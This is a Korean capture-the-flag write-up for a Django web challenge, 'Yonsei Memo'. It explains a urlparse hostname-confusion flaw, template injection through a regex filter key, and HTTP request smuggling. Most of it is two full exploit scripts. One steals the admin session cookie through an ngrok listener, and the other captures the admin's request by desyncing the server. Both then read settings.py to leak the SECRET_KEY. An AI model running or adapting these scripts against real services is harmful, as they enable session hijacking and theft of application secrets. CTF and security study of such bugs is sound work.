# Yonsei Memo

## Vulnerability
### urlparse
yonsei_memo/common.py
```python
def check_url(url):
    o = urlparse(url)
    if o.scheme != 'http':
        return False
    if o.hostname != HOSTNAME:
        return False
    return True
```
+ urlparse에는 url에 @가 포함되어 있을 때 파싱 결과 hostname과 실제 hostname가 불일치할 수 있는 취약점이 있다.
```python
>>> urlparse('http://a.com\@b.com').hostname
'b.com'
```
+ 이를 이용하면 report를 통해 어드민 리퀘스트를 탈취할 수 있다.
> 어드민 리퀘스트에는 세션 정보(쿠키)가 포함되어 있으므로 어드민으로 로그인이 가능하다.
### ssti
yonsei_memo/common.py
```python
def render_template(template, context):
    page = temp_index.split('body_here')[0]
    page += template
    page += temp_index.split('body_here')[1]
    return HttpResponse(Template(page).render(Context(context)))
```
+ response를 만들때 render engine을 바로 사용하지 않고 문자열을 합치듯 템플릿을 만든 뒤 렌더링한다. 따라서 잠재적인 ssti 취약점이 존재한다.
admin/views.py
```python
    if request.method == 'POST':
        key = list(request.POST.keys())[0]
        filters = {key:request.POST[key]}
        msg = 'Searched result for '+request.POST[key]
        
    else:
        filters = {}
        msg = ''
    user_list = get_user_list(filters)
    if len(user_list) == 0:
        msg = 'No result.'

    return render_template(msg+temp_admin_userlist, {'user_list': user_list})
```
templates/userlist.html
```html
    <form method="post">
        <input name="name" type="text"/>
    </form>
```
+ /admin/users 에서 **클라이언트에게 key value를 받아** filter를 구성해 db의 user 테이블을 검색한 결과를 보여준다.
+ `msg+temp_admin_userlist`를 렌더링하는데, 검색 결과가 존재할 경우 `msg = 'Searched result for '+request.POST[key]` 가 된다.
+ user name에는 특수기호가 들어갈 수 없으므로 ssti가 불가능할 것 같지만 사실 가능하다.
+ 검색 filter의 key가 name으로 정해져 있는데, 클라이언트는 post data를 조작해 key를 임의로 조작할 수 있다.
+ django의 doc을 읽어보면 (https://docs.djangoproject.com/en/3.1/ref/models/querysets/#regex) filter로 정규식이 들어갈 수 있다. 컬럼명뒤에 `__regex`를 붙히는 것으로 가능하다.
> 즉 검색의 key로 `name__regex`를, value로 아무 계정의 이름+`|{{7*7}}`을 줌으로써 ssti가 가능해진다.

## Exploit Scenario
1. nc + ngrok 로 로컬 포트 리슨
2. urlparse 취약점 이용해 `ngrok public url + \@211.217.69.153`를 report
3. 어드민 쿠키를 얻어 어드민으로 로그인
4. `POST /admin/users ... name__regex=admin|{% include "yonsei_memo/settings.py" %}`

## Exploit Code
```python
import requests
import random
import time
from pyngrok import ngrok
import socket

host = '211.217.69.153'
port = 32009

def open_port(port):
    s = socket.socket()
    s.bind(("", port))
    s.listen(1)
    ht = ngrok.connect(port, "http")
    return ht.public_url, s

def get_response(s):
    s_r, a = s.accept()
    r = s_r.recv(1024)
    s_r.close()
    return r
    
if __name__=="__main__":
    url = 'http://'+host+':'+str(port)
    name = str(round(random.random()*100000))
    
    reg_form = {"username":name, "password":"hanch", "register":"Register"}
    res = requests.post(url+'/memo/login', data=reg_form, headers={'User-Agent':'loginer'})
    token = res.history[0].cookies['token']
    cookies = {'token':token}

    purl, s = open_port(4000)
    requests.post(url+'/memo/report', data={'url':purl+'\\@211.217.69.153'}, headers={'User-Agent':'reporter'}, cookies=cookies)

    response = get_response(s)
    s.close()
    admin_token = response.split(b'token=')[1].split(b'\r\n')[0].decode()
    print('admin token : '+admin_token)

    cookies = {'token':admin_token}
    injection = {'name__regex':'admin|{% include "yonsei_memo/settings.py" %}'}
    res = requests.post(url+'/admin/users', data=injection, headers={'User-Agent':'attacker'}, cookies=cookies)
    flag = res.text.split('SECRET_KEY = "')[1].split('"')[0]

    print(flag)
```

## HTTP smuggling
CL-TE 테스트를 하다보면 이 서버에 http smuggling 취약점이 존재함을 발견할 수 있다.
이를 이용하면 urlparse 취약점을 이용하지 않아도 어드민 세션 정보를 탈취할 수 있다.
### Exploit Code#2
```python
import requests
import random
from pwn import *

host = '211.217.69.153'
port = 32009

def convert(content):
    return (
        content
        .replace("\n", "\r\n")
        .encode("utf-8")
    )

def trigger_desync(token, i):
    
    content = """GET /memo/memos HTTP/1.1
Host: {host}
User-Agent: attacker
Content-Length: {length}
Transfer-Encoding: \x0bchunked
Connection: keep-alive
Cookie: token={token}

0

"""

    data = 'title=hack&content=admin_http_follow_by'
    payload = '''POST /memo/memos HTTP/1.1
Host: {host}
User-Agent: add on admin request
Content-Length: {length}
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Cookie: token={token}

{data}'''

    r = remote(host, port)
    payload = convert(payload.format(host=host, data=data, length=str(len(data)+i), token=token))
    content = convert(content.format(host=host, length=str(5+len(payload)), token=token))
    final = content+payload
    r.send(final)
    while True:
        try:
            response = r.recv()
            if b'HTTP/1.1 200 OK' in response:
                print('waiting for admin visit...')
        except EOFError:
            break

if __name__=="__main__":
    url = 'http://'+host+':'+str(port)
    name = str(round(random.random()*100000))

    reg_form = {"username":name, "password":"hanch", "register":"Register"}
    res = requests.post(url+'/memo/login', data=reg_form, headers={'User-Agent':'loginer'})
    token = res.history[0].cookies['token']
    cookies = {'token':token}

    i = 240
    while True:
        res = requests.post(url+'/memo/report', data={'url':url}, headers={'User-Agent':'reporter'}, cookies=cookies)
        trigger_desync(token, i)

        res = requests.get(url+'/memo/memos', cookies=cookies)
        cards = res.text.split('<div class="card">')
        last_card = cards[1]
        view_path = last_card.split('<a href="')[1].split('">')[0]
        print(len(cards))
        res = requests.get(url+view_path, cookies=cookies)
        if 'admin_http_follow_by' not in res.text:
            continue
        admin_http = res.text.split('admin_http_follow_by')[1].split('</span>')[0]
        print(admin_http)
        if 'token=' in admin_http:
            steal = admin_http.split('token=')[1]
            if '\r\n' in steal:
                admin_token = steal.split('\r\n')[0]
                break
            if len(steal)>130:
                i += 1
                continue
            else:
                i += 10
                continue
        i += 20     
     
    print('admin token : '+admin_token)

    cookies = {'token':admin_token}
    injection = {'name__regex':'admin|{% include "yonsei_memo/settings.py" %}'}
    res = requests.post(url+'/admin/users', data=injection, headers={'User-Agent':'attacker'}, cookies=cookies)
    flag = res.text.split('SECRET_KEY = "')[1].split('"')[0]

    print(flag)
```